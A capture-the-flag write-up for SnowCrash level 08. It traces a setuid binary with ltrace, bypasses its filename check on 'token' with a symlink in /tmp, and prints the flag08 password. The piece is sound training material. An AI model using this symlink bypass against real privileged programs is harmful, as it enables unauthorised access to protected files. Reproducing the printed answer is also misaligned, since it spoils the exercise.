# Level08
## Description
The level 08 user has an executable **level08** and a token file,  which user is `flag08`.


```bash
ltrace ./level08 token
__libc_start_main(0x8048554, 2, 0xbffff7e4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token")                                                          = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
)                                      = 27
exit(1 <unfinished ...>
+++ exited (status 1) +++
```

## Solution
- Thanx to ltrace we know that we need to somehow change the name of token .<br>However we don't have the permision on the token file.

- We need to create a symbolic link to token to use token in param of **./level08**.

``` bash
level08@SnowCrash:/tmp$ ln -s ~level08/token test
level08@SnowCrash:/tmp$ cd
level08@SnowCrash:~$ ./level08 /tmp/test
quif5eloekouj29ke0vouxean
```

- We found the password of `flag08`, use it to connect to flag08 and execute `getflag`.
